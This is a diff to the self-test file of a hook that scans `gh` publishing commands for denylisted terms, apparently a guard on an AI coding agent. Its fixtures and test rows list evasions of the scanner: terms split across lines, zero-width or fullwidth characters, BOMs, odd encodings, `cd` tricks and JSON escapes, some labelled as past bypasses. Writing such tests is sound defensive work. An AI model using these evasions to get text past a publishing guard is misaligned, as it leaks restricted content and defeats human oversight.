@@ -30,10 +30,13 @@
  *   the BLOCKS they must be (fail closed - the opposite posture to the three guards above). Every row of
  *   theirs also asserts that nothing the hook prints contains a fixture term OR a fixture path (the
  *   fixture root, so also DENYLIST_FILE; native, slash and MSYS forms, case-insensitive): a reason lands in
- *   the transcript and must name sources symbolically. Their rows also pin the ALLOW-EXIT class (the scan allows
- *   only on positive recognition): each DENY row names the scanner's own message, so a block for another reason cannot
- *   pass as the match, and each spelling of a gh command (a leading flag, a wrapper, an interpreter, a path, a quote)
- *   has a DENY row and a routine-work ALLOW row beside it. The audit mode is scored
+ *   the transcript and must name sources symbolically. Their rows score both tiers of the scan (a command that is exactly
+ *   one gh invocation in the strict word grammar, whose text must come from a file; any other gh command, which is only
+ *   searched for publishing gh invocations) and pin the ALLOW-EXIT class (the scan allows only on positive recognition):
+ *   each DENY row names the scanner's own message, so a block for another reason cannot pass as the match; each of the
+ *   sixteen bypasses of the second preflight (the decision of 2026-11-15) has a DENY row with a fixture term in the
+ *   published value; and the routine commands of the delivery ritual each have an ALLOW row in the strict form. The
+ *   self-test also runs MUTATED copies of the scanner (see [7]). The audit mode is scored
  *   against a gh stub that answers read-only `gh api` calls from fixture data (AUDIT rows, [4]).
  *
  * WHY IT EXISTS (do not lose this - it is the whole point)
@@ -440,6 +443,33 @@ function buildFixtures() {
       fs.readFileSync(path.join(gs, "dirty.json"), "utf8").toLowerCase().indexOf(GS_TERMS[1]) < 0) {
     throw new Error("the gh-scan dirty fixtures do not contain their term - the DENY rows would not discriminate");
   }
+  // Tier A body files that hide a term from a raw per-line search: split across a line break (the first term; the second,
+  // which holds a space, split at its space and padded), a zero-width space inside, fullwidth letters; plus a BOM in front
+  // of the term, and the files the hook must refuse: UTF-16, a NUL byte, invalid UTF-8, over the size cap. `sub` is
+  // the cd target.
+  const t0 = GS_TERMS[0];
+  const t1 = GS_TERMS[1];
+  const hidden = {
+    "split.md": "intro" + NL + t0.slice(0, t0.indexOf("-") + 1) + NL + t0.slice(t0.indexOf("-") + 1) + NL,
+    "split2.md": "intro" + NL + t1.split(" ")[0] + NL + t1.split(" ")[1] + NL,
+    "padded.md": "intro " + t1.split(" ")[0] + "   " + t1.split(" ")[1] + NL,
+    "zw.md": "intro " + t0.slice(0, 4) + String.fromCharCode(0x200b) + t0.slice(4) + NL,
+    "fullwidth.md": "intro " + Array.from(t0).map((c) => (c === "-" ? String.fromCharCode(0xff0d) : String.fromCharCode(c.charCodeAt(0) + 0xfee0))).join("") + NL,
+  };
+  for (const name of Object.keys(hidden)) {
+    fs.writeFileSync(path.join(gs, name), hidden[name]);
+    // By-construction: a raw per-line, case-insensitive search must NOT find a term in these, or the row would pass for the wrong reason.
+    if (hidden[name].split(NL).some((l) => GS_TERMS.some((t) => l.toLowerCase().indexOf(t) >= 0))) {
+      throw new Error(name + " holds a term in plain text - its row would not discriminate the hidden-term matching");
+    }
+  }
+  fs.writeFileSync(path.join(gs, "bom-dirty.md"), String.fromCharCode(0xfeff) + t0 + " here" + NL);
+  fs.writeFileSync(path.join(gs, "utf16.md"), Buffer.from(String.fromCharCode(0xfeff) + "first" + NL + "second" + NL, "utf16le"));
+  fs.writeFileSync(path.join(gs, "nul.md"), Buffer.from("fi" + String.fromCharCode(0) + "rst" + NL));
+  fs.writeFileSync(path.join(gs, "latin1.md"), Buffer.from([0x66, 0xe9, 0x0a]));
+  fs.writeFileSync(path.join(gs, "big.md"), Buffer.alloc(4 * 1024 * 1024 + 1, 97));
+  fs.mkdirSync(path.join(gs, "sub"), { recursive: true });
+  fs.writeFileSync(path.join(gs, "sub", "b.txt"), "clean text" + NL);
   repos.ghscan = gs;
   return { root: root, repos: repos };
 }
@@ -1173,328 +1203,427 @@ row({ id: "ce-a06", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "echo en
 // `dl` picks the denylist the run sees (ok | missing | empty | xdg | home), `scanner: "absent"` points
 // CLAUDE_PROJECT_DIR at a dir with no scripts/, `tool` overrides the tool_name. The fixture dir is `ghscan`
 // and its denylist holds GS_TERMS; every row's output is also checked for those terms (see runRows).
+// The scan has two tiers (see scripts/denylist-scan.js): TIER A, a command that is exactly ONE gh invocation (at most
+// one `cd` before it) in the strict word grammar, whose text must come from a file; TIER B, everything else that
+// mentions gh, which is only searched for gh invocations and blocks any that publish. Every DENY row pins the
+// scanner's OWN message (`msg`), so a block for another reason cannot score as the match.
 const G = (x, f) => fwd(x.ghscan) + "/" + f;
+// A path as the strict form accepts it: bare when it holds only strict-form characters, else single-quoted (a temp dir
+// can hold ~ or spaces).
+const GP = (x, f) => { const p = G(x, f); return /^[A-Za-z0-9._\/:=@-]+$/.test(p) ? p : "'" + p + "'"; };
 const NATIVE = (x, f) => path.join(x.ghscan, f);
-const gb = (id, expect, cmd, note, o) => row(Object.assign(
-  { id: id, guard: "gh-scan-bash", cwd: "ghscan", cmd: cmd, expect: expect, note: note }, o || {}));
-const gp = (id, expect, cmd, note, o) => row(Object.assign(
-  { id: id, guard: "gh-scan-ps", cwd: "ghscan", cmd: cmd, expect: expect, note: note }, o || {}));
+const NP = (x, f) => "'" + NATIVE(x, f) + "'";
+const ctr = {};
+const mkRow = (guard, pre) => (expect, cmd, note, o) => {
+  const k = pre + (expect === "DENY" ? "d" : "a");
+  ctr[k] = (ctr[k] || 0) + 1;
+  row(Object.assign({ id: k + String(ctr[k]).padStart(2, "0"), guard: guard, cwd: "ghscan", cmd: cmd, expect: expect, note: note }, o || {}));
+};
+const gb = mkRow("gh-scan-bash", "gb-");
+const gp = mkRow("gh-scan-ps", "gp-");
 const TA = "Bowsprit-Ledger";
 const TB = "MAELSTROM roster";
+const MB = { msg: "must be the only command in the call" };
+const MI = { msg: "inline body or notes text is not accepted" };
+const BSL = String.fromCharCode(92);
+const BT2 = String.fromCharCode(96);
+const SHA = "0123456789abcdef0123456789abcdef01234567";
 
-gb("gb-d01", "DENY", "gh issue create --title t --body \"see " + TA + " here\"",
-  "CONTROL - an inline --body value; fails if the hook never ran, never reads the denylist, or matches case-sensitively",
-  { msg: "gh issue create --body, line 1" });
-gb("gb-d02", "DENY", (x) => "gh issue comment 5 --body-file " + G(x, "dirty.md"),
-  "a body FILE's contents, and the line number of the hit in it - fails if file contents are not scanned or the line is wrong",
+// ===== TIER A: one gh invocation, text from a file ================================================
+gb("DENY", (x) => "gh issue comment 5 --body-file " + GP(x, "dirty.md"),
+  "CONTROL - a body FILE's contents and the hit's line number; fails if the hook never ran, never reads the denylist, matches case-sensitively, or does not read files",
   { msg: "--body-file (file contents), line 3" });
-gb("gb-d03", "DENY", "gh pr create --title t --body-file - <<'EOF'" + NL + "ok" + NL + TB + NL + "EOF",
-  "a heredoc feeding --body-file - (stdin) - fails if heredoc bodies are stripped like the other guards do",
-  { msg: "--body-file (stdin), line 2" });
-gb("gb-d04", "DENY", "gh pr create --title t --body \"$(cat <<'EOF'" + NL + "ok" + NL + TA + NL + "EOF" + NL + ")\"",
-  "the $(cat <<'EOF' ...) body idiom - fails if a command substitution is treated as unknowable and blocks for the wrong reason, or as clean",
-  { msg: "gh pr create --body, line 2" });
-gb("gb-d05", "DENY", "gh api repos/o/r/issues -f title=ok -f body=\"" + TA + "\"",
-  "a gh api -f value (the second -f) - fails if api fields are not scanned or the key is scanned instead of the value",
-  { msg: "gh api -f #2, line 1" });
-gb("gb-d06", "DENY", (x) => "gh api repos/o/r/issues --input " + G(x, "dirty.json"),
-  "gh api --input <file> - fails if --input is not read (the second fixture term, in a JSON body)",
-  { msg: "gh api --input (file contents), line 1" });
-gb("gb-d07", "DENY", (x) => "gh api repos/o/r/issues -F body=@" + G(x, "dirty.md"),
-  "gh api -F key=@file - fails if the @file form is sent unread",
-  { msg: "gh api -F #1 (file contents), line 3" });
-gb("gb-d08", "DENY", "gh issue comment 5 --body=" + TA.toUpperCase(),
-  "the --flag=value form, upper-cased - fails if only the two-word form is parsed or matching is case-sensitive",
-  { msg: "--body, line 1" });
-gb("gb-d09", "DENY", "gh issue comment 5 -b\"" + TA + "\"",
-  "a short flag with an attached value - fails if -bVALUE is not split", { msg: "--body, line 1" });
-gb("gb-d10", "DENY", (x) => "gh issue comment 5 -F " + G(x, "dirty.md"),
-  "short -F as body-file on an issue command - fails if -F is only known as the api field flag", { msg: "--body-file (file contents)" });
-gb("gb-d11", "DENY", "gh release create v1 --title t --notes \"" + TA + "\"",
-  "release --notes", { msg: "gh release create --notes, line 1" });
-gb("gb-d12", "DENY", (x) => "gh release create v1 --title t --notes-file " + G(x, "dirty.md"),
-  "release --notes-file", { msg: "--notes-file (file contents), line 3" });
-gb("gb-d13", "DENY", "gh pr merge 5 --squash --subject \"" + TA + "\"",
-  "pr merge --subject (the squash commit subject)", { msg: "gh pr merge --subject" });
-gb("gb-d14", "DENY", "gh issue comment 5 --body \"" + TB + "\"",
-  "the second denylist line (CRLF file, a term with a space, mixed case) - fails if only the first term is read or CR is not stripped",
-  { msg: "--body, line 1" });
-gb("gb-d15", "DENY", "gh issue comment 5 -F dirty.md",
-  "a RELATIVE body file resolves against the hook JSON cwd - fails if it resolves against the hook's own cwd", { msg: "(file contents), line 3" });
-if (process.platform === "win32") {
-  gb("gb-d16", "DENY", (x) => "gh issue comment 5 -F " + fwd(x.ghscan).replace(/^([A-Za-z]):/, (m, d) => "/" + d.toLowerCase()) + "/dirty.md",
-    "a Git Bash /c/... path - fails if the MSYS drive form is not mapped (the file would read as missing, a DENY for the WRONG reason)",
-    { msg: "(file contents), line 3" });
-}
-gb("gb-d17", "DENY", (x) => "cat " + G(x, "dirty.md") + " | gh issue comment 5 -F -",
-  "a pipe from cat of a file - resolved, not just blocked as a pipe", { msg: "--body-file (stdin), line 3" });
-gb("gb-d18", "DENY", (x) => "gh issue comment 5 -F - < " + G(x, "dirty.md"),
-  "stdin redirected from a file", { msg: "--body-file (stdin), line 3" });
-gb("gb-d19", "DENY", "gh issue comment 5 --body \"$BODY\"",
-  "UNRESOLVABLE: a shell variable as a body - fails if an expansion is let through; the reason must advise a file", { msg: "through a file" });
-gb("gb-d20", "DENY", "make-notes | gh issue comment 5 -F -",
-  "UNRESOLVABLE: a pipe from another command", { msg: "not visible to the hook" });
-gb("gb-d21", "DENY", (x) => "gh issue comment 5 --body-file " + G(x, "no-such-file.md"),
-  "an unreadable body file blocks - fails if a read error is treated as clean", { msg: "unreadable" });
-gb("gb-d22", "DENY", "gh issue comment 5 --body \"never closed",
-  "a gh command that cannot be parsed blocks", { msg: "could not parse" });
-gb("gb-d23", "DENY", "bash -c 'gh issue comment 5 --body \"" + TA + "\"'",
-  "gh inside bash -c - fails if interpreter arguments are not re-parsed", { msg: "--body, line 1" });
-gb("gb-d24", "DENY", "u=$(gh issue create --title t --body \"" + TA + "\")",
-  "gh inside a command substitution", { msg: "--body, line 1" });
-gb("gb-d25", "DENY", (x) => "cat > " + G(x, "w.md") + " <<'EOF'" + NL + TA + NL + "EOF" + NL + "gh issue comment 5 --body-file " + G(x, "w.md"),
-  "a file written in the SAME command - its heredoc is what gets published; the file is not on disk yet",
-  { msg: "(file contents), line 1" });
-gb("gb-d26", "DENY", (x) => "some-tool > " + G(x, "clean.md") + " && gh issue comment 5 --body-file " + G(x, "clean.md"),
-  "a file overwritten in the same command by something unreadable - fails if the stale clean file on disk is scanned instead", { msg: "rewritten in this command" });
-gb("gb-d27", "DENY", "(garbage stdin)", "unparseable hook JSON blocks - fails if the parse error is swallowed",
-  { stdinShape: "garbage", msg: "not valid JSON" });
-gb("gb-d28", "DENY", "gh issue comment 5 --body ok",
-  "CONTROL (fail closed) - denylist file MISSING blocks every gh publish even with clean text", { dl: "missing", msg: "denylist file missing" });
-gb("gb-d29", "DENY", "gh issue comment 5 --body ok",
-  "CONTROL (fail closed) - denylist with only a comment and blanks blocks", { dl: "empty", msg: "no terms" });
-gb("gb-d30", "DENY", "gh issue comment 5 --body ok",
-  "CONTROL (blocks on its own errors) - the scanner script is ABSENT: the saved command alone must turn node's failure into exit 2",
-  { scanner: "absent" });
-gb("gb-d31", "DENY", "gh issue comment 5 --body \"" + TA + "\"",
-  "the XDG_CONFIG_HOME default location - fails if only DENYLIST_FILE is honoured", { dl: "xdg", msg: "--body, line 1" });
-gb("gb-d32", "DENY", "gh issue comment 5 --body \"" + TA + "\"",
-  "the $HOME/.config default location", { dl: "home", msg: "--body, line 1" });
-gb("gb-d33", "DENY", "gh issue close 5 --comment \"" + TA + "\"", "issue close --comment", { msg: "gh issue close --comment" });
-gb("gb-d34", "DENY", "$GH issue create --title t --body ok",
-  "UNRESOLVABLE: a command name built from a variable cannot be judged", { msg: "call gh by name" });
-gb("gb-d35", "DENY", "gh issue comment 5 --body $'x\\n" + TA + "'",
-  "an ANSI-C quoted body is decoded", { msg: "--body, line 2" });
-gb("gb-d36", "DENY", "echo hi", "a tool this hook does not understand blocks (matcher drift must not pass silently)",
-  { tool: "Read", msg: "not Bash or PowerShell" });
+gb("DENY", "gh issue comment 5 -F dirty.md",
+  "a RELATIVE body file resolves against the hook JSON cwd (no cd before it) - fails if it resolves against the hook's own cwd", { msg: "(file contents), line 3" });
+gb("DENY", "gh issue comment 5 --body-file=dirty.md", "the --flag=value form", { msg: "--body-file (file contents), line 3" });
+gb("DENY", "gh issue comment 5 -Fdirty.md", "a short flag with its value attached", { msg: "--body-file (file contents), line 3" });
+gb("DENY", "gh issue comment 5 -F 'dirty.md'", "a single-quoted path", { msg: "(file contents), line 3" });
+gb("DENY", "gh issue comment 5 -F \"dirty.md\"", "a double-quoted path", { msg: "(file contents), line 3" });
+gb("DENY", "gh release create v1 --title t --notes-file dirty.md", "release --notes-file", { msg: "--notes-file (file contents), line 3" });
+gb("DENY", "gh pr create -t x -F dirty.md", "pr create -F", { msg: "--body-file (file contents), line 3" });
+gb("DENY", "gh issue new -t x -F dirty.md", "the `new` alias of issue create, with a body file", { msg: "--body-file (file contents), line 3" });
+gb("DENY", "gh pr merge 5 --squash --body-file dirty.md", "pr merge builds its commit message from the body", { msg: "--body-file (file contents), line 3" });
+gb("DENY", "gh pr create -t x --template dirty.md", "a pr create template FILE is scanned like a body file", { msg: "--template (file contents), line 3" });
+gb("DENY", "gh pr create -t x --template=dirty.md", "the --template=file form", { msg: "--template (file contents), line 3" });
+gb("DENY", "gh pr create -t x -T no-such-file.md", "an unreadable template file blocks", { msg: "missing or unreadable" });
+gb("DENY", "gh api repos/o/r/issues -F body=@dirty.md", "gh api -F key=@file", { msg: "gh api -F #1 (file contents), line 3" });
+gb("DENY", "gh api repos/o/r/issues --input dirty.json", "gh api --input <file>: raw scan (the second fixture term, in a JSON body)", { msg: "gh api --input (file contents), line 1" });
+gb("DENY", "gh api repos/o/r/issues --input recover-esc.json",
+  "BYPASS 12 - a JSON --input whose term is written with a unicode escape: only the DECODED strings show it - fails if only the raw file is scanned", { msg: "gh api --input (decoded), line " });
+gb("DENY", "gh api repos/o/r/issues --input recover-bad.json", "an --input file that is not JSON cannot be read reliably, so it blocks", { msg: "not valid JSON" });
+gb("DENY", "gh issue create -t x --body-file clean.md --recover recover-dirty.json", "a recover file holding the term (raw scan)", { msg: "--recover (file contents), line 1" });
+gb("DENY", "gh issue create -t x --body-file clean.md --recover recover-esc.json", "a recover file with an escaped term: decoded scan", { msg: "--recover (decoded), line " });
+gb("DENY", "gh issue create -t x --body-file clean.md --recover recover-bad.json", "a recover file that is not JSON blocks", { msg: "not valid JSON" });
+gb("DENY", "gh issue comment 5 --body-file split.md",
+  "a term split across a LINE BREAK in a body file (reported at the line it starts on) - fails if matching is per line only", { msg: "(file contents), line 2" });
+gb("DENY", "gh issue comment 5 --body-file split2.md",
+  "the second term (it holds a space) split at its space by a line break - fails if the line-break-joined views do not also fold a break into a blank", { msg: "(file contents), line 2" });
+gb("DENY", "gh issue comment 5 --body-file padded.md", "the second term with extra spaces between its words", { msg: "(file contents), line 1" });
+gb("DENY", "gh issue comment 5 --body-file zw.md", "a term with a zero-width space inside - fails if format characters are not stripped before matching", { msg: "(file contents), line 1" });
+gb("DENY", "gh issue comment 5 --body-file fullwidth.md", "a term written in fullwidth letters - fails if NFKC folding is not applied", { msg: "(file contents), line 1" });
+gb("DENY", "gh issue comment 5 --body-file bom-dirty.md", "a UTF-8 BOM in front of the term (one BOM is stripped, the text still read)", { msg: "(file contents), line 1" });
+gb("DENY", "gh issue comment 5 --body-file utf16.md", "UTF-16 text (what a Windows editor or `>` redirection often writes) cannot be read as UTF-8 and blocks - fails if it reads as clean", { msg: "NUL byte" });
+gb("DENY", "gh issue comment 5 --body-file nul.md", "a NUL byte blocks", { msg: "NUL byte" });
+gb("DENY", "gh issue comment 5 --body-file latin1.md", "bytes that are not valid UTF-8 block", { msg: "not valid UTF-8" });
+gb("DENY", "gh issue comment 5 --body-file no-such-file.md", "a missing body file blocks - fails if a read error is treated as clean", { msg: "missing or unreadable" });
+gb("DENY", "gh issue comment 5 --body-file sub", "a directory is not a regular file", { msg: "not a regular file" });
+gb("DENY", "gh issue comment 5 --body-file -", "stdin as the body file: the text comes from something the hook cannot read", { msg: "stdin or nothing" });
+gb("DENY", "gh issue comment 5 --body-file /dev/stdin", "the stdin device path is not a regular file", { msg: "--body-file:" });
+gb("DENY", "gh issue comment 5 -F big.md", "a file over the size cap blocks", { msg: "larger than" });
+gb("DENY", (x) => "cd " + GP(x, "sub") + " && gh issue comment 5 --body-file b.txt",
+  "BYPASS 13 - a cd before gh: the relative path would resolve somewhere the hook cannot follow - fails if it is resolved against the hook cwd", { msg: "after a cd the file path must be absolute" });
+gb("DENY", (x) => "cd " + GP(x, "sub") + "; gh issue comment 5 --body-file ../dirty.md", "the same with ; and a path that climbs out", { msg: "after a cd the file path must be absolute" });
+gb("DENY", (x) => "cd " + GP(x, "sub") + " && gh issue comment 5 --body-file " + GP(x, "dirty.md"), "cd then an ABSOLUTE path: accepted as a path, and its dirty contents found", { msg: "(file contents), line 3" });
+gb("DENY", (x) => "cd " + GP(x, "sub") + " && cd " + GP(x, "sub") + " && gh issue comment 5 --body-file " + GP(x, "clean.md"), "two cd: not the strict form", MB);
 
-// Odd whitespace: the parser once skipped only space/tab/CR at the top level while the word reader stopped at
-// ANY s, so a word ending in FF, VT, NBSP, U+2028 or U+FEFF looped forever and the hook never returned. Every row
-// pins the scanner's own match message, so a timeout-block (a different message) cannot score as a pass.
-const FF = String.fromCharCode(12);
-const VT = String.fromCharCode(11);
-const NBSP = String.fromCharCode(0xa0);
-const LS = String.fromCharCode(0x2028);
-const BOM = String.fromCharCode(0xfeff);
-gb("gb-d37", "DENY", "gh issue comment 1 -b " + TA + FF, "a body word followed by a form feed - fails if the parser hangs or the FF is not a separator", { msg: "--body, line 1" });
-gb("gb-d38", "DENY", "gh issue comment 1 -b " + TA + " " + VT + "x", "a body word, a space, a vertical tab and a word", { msg: "--body, line 1" });
-gb("gb-d39", "DENY", "gh issue comment 1 -b " + TA + NBSP + "x", "a body word followed by a no-break space", { msg: "--body, line 1" });
-gb("gb-d40", "DENY", "gh issue comment 1 -b " + TA + LS + "x", "a body word followed by U+2028", { msg: "--body, line 1" });
-gb("gb-d41", "DENY", BOM + "gh issue comment 1 -b " + TA, "a leading U+FEFF before the command", { msg: "--body, line 1" });
-gb("gb-d42", "DENY", NBSP + "gh" + NBSP + "issue comment 1 -b " + TA, "no-break spaces around the command words", { msg: "--body, line 1" });
-gp("gp-d13", "DENY", "gh issue comment 1 --body '" + TA + "'" + NBSP + "x", "a PowerShell body followed by a no-break space", { msg: "--body, line 1" });
-gb("gb-d43", "DENY", "gh issue comment 5 --body ok",
+// ---- Tier A: short title-like fields are scanned inline; body and notes are not accepted inline ---------
+gb("DENY", "gh issue create --title '" + TA + " x' --body-file clean.md", "a title with the term (single-quoted)", { msg: "gh issue create --title, line 1" });
+gb("DENY", "gh issue create -t \"x " + TA.toUpperCase() + "\" --body-file clean.md", "a double-quoted title, upper-cased: matching is case-insensitive", { msg: "gh issue create --title, line 1" });
+gb("DENY", "gh issue create --title=" + TA + " --body-file clean.md", "the --title=value form", { msg: "gh issue create --title, line 1" });
+gb("DENY", "gh issue create --title='x " + TA + "' --body-file clean.md", "--title='...' (a bare prefix and one quoted string)", { msg: "gh issue create --title, line 1" });
+gb("DENY", "gh pr create -dt '" + TA + "' --body-file clean.md", "a boolean (-d) then the title letter in one cluster: the TITLE is the cluster's value", { msg: "gh pr create --title, line 1" });
+gb("DENY", "gh pr merge 5 --squash --subject '" + TA + "'", "pr merge --subject (the squash commit subject)", { msg: "gh pr merge --subject, line 1" });
+gb("DENY", "gh issue close 5 --comment '" + TA + "'", "issue close --comment", { msg: "gh issue close --comment, line 1" });
+gb("DENY", "gh label create x --description '" + TA + "'", "label --description", { msg: "gh label create --description, line 1" });
+gb("DENY", "gh repo new demo -d '" + TA + "'", "the `new` alias of repo create, short description flag", { msg: "gh repo create --description, line 1" });
+gb("DENY", "gh pr new --title '" + TA + "' --body-file clean.md", "the `new` alias of pr create", { msg: "gh pr create --title, line 1" });
+gb("DENY", "gh pr revert 5 --title '" + TA + "' --body-file clean.md", "pr revert publishes a title", { msg: "gh pr revert --title, line 1" });
+gb("DENY", "gh api repos/o/r/issues -f title=ok -f note='" + TA + "'", "a gh api -f value (the second -f): the value is scanned, not the key", { msg: "gh api -f #2, line 1" });
+gb("DENY", "gh api repos/o/r/issues -F title=" + TA, "a gh api -F value", { msg: "gh api -F #1, line 1" });
+gb("DENY", "gh api repos/o/r/issues -if title=" + TA, "gh api: -i is boolean, -f takes the next argument", { msg: "gh api -f #1, line 1" });
+gb("DENY", "gh issue create --title ok --body-file clean.md --attach './p.png#alt " + TA + "'", "alt text after # is published", { msg: "--attach (alt text), line 1" });
+gb("DENY", "gh issue comment 1 -F clean.md --attach './a.png#" + TA + "'", "alt text on issue comment", { msg: "--attach (alt text), line 1" });
+gb("DENY", "gh issue comment 1 -F clean.md --attach ./a.png#clean", "an unquoted # is a comment mark, so not the strict form", MB);
+gb("DENY", "gh issue create --title \"a $x b\" --body-file clean.md",
+  "a double-quoted title holding a dollar sign: not the strict form, and a publishing gh outside it blocks", MB);
+gb("DENY", "gh issue create --title \"a " + BT2 + "x" + BT2 + " b\" --body-file clean.md", "a double-quoted title holding backticks", MB);
+gb("DENY", "gh issue create --title \"a " + BSL + "n b\" --body-file clean.md", "a double-quoted title holding a backslash", MB);
+gb("DENY", "gh issue create --title \"a !x b\" --body-file clean.md", "a double-quoted title holding !", MB);
+gb("DENY", "gh issue create --title a$x --body-file clean.md", "a bare word holding an expansion", MB);
+gb("DENY", "gh issue create --title 'it''s' --body-file clean.md", "adjacent quoted strings (a doubled quote)", MB);
+gb("DENY", "gh issue create --title 'a'b --body-file clean.md", "text glued after a quoted string", MB);
+gb("DENY", "gh issue create --title '' --body-file clean.md", "an empty string (Windows PowerShell 5.1 would drop it from the argument list)", MB);
+gb("DENY", "gh issue create --title 'one two' --body-file clean.md 2>&1", "a redirection is not the strict form", MB);
+gb("DENY", "gh issue create --title ok --body-file clean.md # " + TA, "a trailing comment is not the strict form", MB);
+gb("DENY", "gh issue create --title ok --body-file clean.md;", "a trailing ;", MB);
+gb("DENY", "gh issue comment 5 --body \"clean\"", "CONTROL - an inline body is refused even when clean, with the advice to use a file", MI);
+gb("DENY", "gh issue comment 5 --body \"" + TA + "\"", "an inline body with the term: refused as inline (the refusal comes first)", MI);
+gb("DENY", "gh issue comment 5 --body=ok", "--body=value", MI);
+gb("DENY", "gh issue comment 5 -b ok", "-b value", MI);
+gb("DENY", "gh issue comment 5 -bok", "-bvalue", MI);
+gb("DENY", "gh issue create -t sloop -wb ok", "a boolean (-w) then -b in one cluster: the cluster walk finds the body flag - fails if only the first letter is read", { msg: "gh issue create --body: inline" });
+gb("DENY", "gh issue create -t sloop -wb=ok", "cluster, then = and the value", { msg: "gh issue create --body: inline" });
+gb("DENY", "gh release create v1 --title t --notes ok", "release --notes inline", { msg: "gh release create --notes: inline" });
+gb("DENY", "gh release create v9.9.9 -n ok", "release -n inline", { msg: "gh release create --notes: inline" });
+gb("DENY", "gh pr review 5 -b ok", "pr review body inline", { msg: "gh pr review --body: inline" });
+gb("DENY", "gh pr merge 5 --squash --body ok", "pr merge body inline", { msg: "gh pr merge --body: inline" });
+gb("DENY", "gh api repos/o/r/issues -f body=ok", "an inline api body field (key body) is refused like --body", { msg: "an inline body field is not accepted" });
+gb("DENY", "gh api repos/o/r/issues -F notes=ok", "an inline api notes field", { msg: "an inline notes field is not accepted" });
+gb("DENY", "gh --body ok issue comment 5", "a TEXT flag before the verb is the verb's flag: the inline body is refused", { msg: "gh issue comment --body: inline" });
+gb("DENY", "gh -b ok -t sloop issue create -R o/r --body-file dirty.md", "leading text flags plus a body file after the verb: both found", { msg: "gh issue create --body: inline" });
+
+// fail-closed controls: a publishing command in the strict form, so the only thing that can block it is the control
+gb("DENY", "gh issue comment 5 --body-file clean.md", "CONTROL (fail closed) - denylist file MISSING blocks every gh publish even with clean text", { dl: "missing", msg: "denylist file missing" });
+gb("DENY", "gh issue comment 5 --body-file clean.md", "CONTROL (fail closed) - a denylist with only a comment and blanks blocks", { dl: "empty", msg: "no terms" });
+gb("DENY", "gh issue comment 5 --body-file clean.md",
+  "CONTROL (blocks on its own errors) - the scanner script is ABSENT: the saved command alone must turn node's failure into exit 2", { scanner: "absent" });
+gb("DENY", "gh issue comment 5 --body-file dirty.md", "the XDG_CONFIG_HOME default location - fails if only DENYLIST_FILE is honoured", { dl: "xdg", msg: "(file contents), line 3" });
+gb("DENY", "gh issue comment 5 --body-file dirty.md", "the $HOME/.config default location", { dl: "home", msg: "(file contents), line 3" });
+gb("DENY", "(garbage stdin)", "unparseable hook JSON blocks - fails if the parse error is swallowed", { stdinShape: "garbage", msg: "not valid JSON" });
+gb("DENY", "echo hi", "a tool this hook does not understand blocks (matcher drift must not pass silently)", { tool: "Read", msg: "not Bash or PowerShell" });
+gb("DENY", "gh issue comment 5 --body-file clean.md",
   "CONTROL (a hang blocks) - the scanner stub never returns: only the `timeout` inside the saved command can turn that into exit 2 (124), " +
   "and the per-row limit scores a missing bound as ERROR, never a stall", { scanner: "hang", msg: "did not complete (exit 124)" });
-gb("gb-d44", "DENY", "gh issue comment 5 --body ok",
+gb("DENY", "gh issue comment 5 --body-file clean.md",
   "CONTROL (a missing tool blocks) - the saved command run with an empty PATH (a prefix only; the command is the one on disk): " +
   "timeout cannot start, exit 127, and the fallback must block with its fixed message", { prefix: "PATH=/no-such-dir; ", msg: "did not complete (exit 127)" });
 
-// gh aliases, read from the ALIASES section of `gh <group> <verb> --help` (issue/pr/release/repo `new`), and the
-// class rule: a verb the table does not know BLOCKS (allow only on positive recognition; gb-d67 pins it without a text flag).
-gb("gb-d45", "DENY", "gh issue new -t x -b \"" + TA + "\"", "the `new` alias of issue create - fails if only the canonical verb is scanned", { msg: "gh issue create --body, line 1" });
-gb("gb-d46", "DENY", "gh pr new --title t --body \"" + TA + "\"", "the `new` alias of pr create", { msg: "gh pr create --body, line 1" });
-gb("gb-d47", "DENY", "gh release new v9.9.9 -n \"" + TA + "\"", "the `new` alias of release create", { msg: "gh release create --notes, line 1" });
-gb("gb-d48", "DENY", "gh repo new demo -d \"" + TA + "\"", "the `new` alias of repo create", { msg: "gh repo create --description, line 1" });
-gb("gb-d49", "DENY", (x) => "gh issue new -t x -F " + G(x, "dirty.md"), "an alias with a body FILE", { msg: "--body-file (file contents), line 3" });
-gb("gb-d50", "DENY", "gh pr revert 5 --title t --body \"" + TA + "\"", "pr revert publishes a body and a title", { msg: "gh pr revert --body, line 1" });
-gb("gb-d51", "DENY", "gh issue frobnicate 5 --body ok", "UNKNOWN verb with a text flag blocks even when the text is clean - fails if unknown verbs pass", { msg: "does not know" });
-gb("gb-d52", "DENY", "gh release frobnicate v1 -n \"" + TA + "\"", "unknown release verb, short text flag", { msg: "does not know" });
-gb("gb-d53", "DENY", "gh label frobnicate x --description y", "unknown label verb, long text flag", { msg: "does not know" });
-gb("gb-d54", "DENY", "gh repo frobnicate x -h y", "unknown repo verb, short text flag", { msg: "does not know" });
-gb("gb-d55", "DENY", "gh issue -R o/r create -b \"" + TA + "\"", "flags BETWEEN the group and the verb: the verb is found past them and its text flags scanned - fails if the flag is taken for the verb and the command passes", { msg: "gh issue create --body, line 1" });
-gb("gb-d56", "DENY", "gh issue artifact create 5 --body-file x.md", "a nested verb that publishes text (issue artifact)", { msg: "does not know" });
-gb("gb-d57", "DENY", "gh issue frobnicate 5 -wb x", "a short-flag cluster ending in a text flag", { msg: "does not know" });
-// Short-flag CLUSTERS on KNOWN verbs (pflag: every letter is a flag, booleans chain, the first value-taking letter takes
-// the rest of the token, after an optional =, or the next argument). Each DENY pins the scanner's own field message.
-gb("gb-d58", "DENY", "gh issue create -t sloop -wb " + TA, "a boolean (-w) then a text flag (-b) in one cluster, value in the next argument - fails if only the first letter is read", { msg: "gh issue create --body, line 1" });
-gb("gb-d59", "DENY", "gh pr create -dt " + TA + " -b sloop", "boolean -d then -t: the TITLE is the cluster's value", { msg: "gh pr create --title, line 1" });
-gb("gb-d60", "DENY", "gh issue create -t sloop -wb=" + TA, "cluster, then = and the value - fails if the = form is not split off", { msg: "gh issue create --body, line 1" });
-gb("gb-d61", "DENY", "gh issue create -t sloop -wb" + TA, "cluster with the value attached to the text letter", { msg: "gh issue create --body, line 1" });
-gb("gb-d62", "DENY", "gh issue create -t sloop -wZ ok", "a letter the table does not know blocks even with clean text (it could be a text flag of a newer gh)", { msg: "letter this scan does not know" });
-gb("gb-d63", "DENY", "gh api repos/o/r/issues -if body=" + TA, "gh api: -i is boolean, -f takes the next argument", { msg: "gh api -f #1, line 1" });
